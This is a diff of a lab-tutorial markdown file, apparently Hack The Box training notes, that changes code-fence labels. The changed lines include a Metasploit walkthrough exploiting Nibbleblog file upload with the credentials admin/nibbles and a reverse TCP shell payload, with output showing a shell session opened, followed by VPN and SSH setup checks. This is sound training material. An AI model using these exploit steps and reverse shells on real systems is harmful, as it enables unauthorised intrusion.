 
 	set username admin
 
-```shell-session
+```text
 username => admin
 ```
 
 	set password nibbles
 
-```shell-session
+```text
 password => nibbles
 ```
 
 	set targeturi nibbleblog
 
-```shell-session
+```text
 targeturi => nibbleblog
 ```
 
@@ -2965,13 +2965,13 @@ We also need to change the payload type. For our purposes let's go with `generi
 
 	set payload generic/shell_reverse_tcp
 
-```shell-session
+```text
 payload => generic/shell_reverse_tcp
 ```
 
 	show options 
 
-```shell-session
+```text
 Module options (exploit/multi/http/nibbleblog_file_upload):
 
    Name       Current Setting  Required  Description
@@ -3003,7 +3003,7 @@ Exploit target:
 
 	exploit
 
-```shell-session
+```text
 [*] Started reverse TCP handler on 10.10.14.2:4444 
 [*] Command shell session 4 opened (10.10.14.2:4444 -> 10.129.42.190:53642) at 2021-04-21 16:32:37 +0000
 [+] Deleted image.php
@@ -3011,7 +3011,7 @@ Exploit target:
 
 	id
 
-```shell-session
+```text
 uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
 ```
 
@@ -3047,7 +3047,7 @@ The easiest method of checking if we have successfully connected to the VPN netw
 
 	sudo openvpn ./htb.ovpn
 
-```shell-session
+```text
 ...SNIP...
 
 Initialization Sequence Completed
@@ -3059,7 +3059,7 @@ Another way of checking whether we are connected to the VPN network is by checki
 
 	ip -4 a show tun0
 
-```shell-session
+```text
 6: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
     inet 10.10.10.1/23 scope global tun0
        valid_lft forever preferred_lft forever
@@ -3074,7 +3074,7 @@ Another way to check for connectivity is to use the command `sudo netstat -rn`�
 	sudo netstat -rn
 
 
-```shell-session
+```text
 [sudo] password for user: 
 
 Kernel IP routing table
@@ -3091,7 +3091,7 @@ From here, we can see that we are connected to the `10.10.14.0/23` network on 
 
 	ping -c 4 10.10.14.1
 
-```shell-session
+```text
 PING 10.10.14.1 (10.10.14.1) 56(84) bytes of data.
 64 bytes from 10.10.14.1: icmp_seq=1 ttl=64 time=111 ms
 64 bytes from 10.10.14.1: icmp_seq=2 ttl=64 time=111 ms
@@ -3151,7 +3151,7 @@ In case we start facing some issues with connecting to SSH servers or connecting
 
 	ssh-keygen
 
-```shell-session
+```text
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/parrot/.ssh/id_rsa): 
 Enter passphrase (empty for no passphrase):
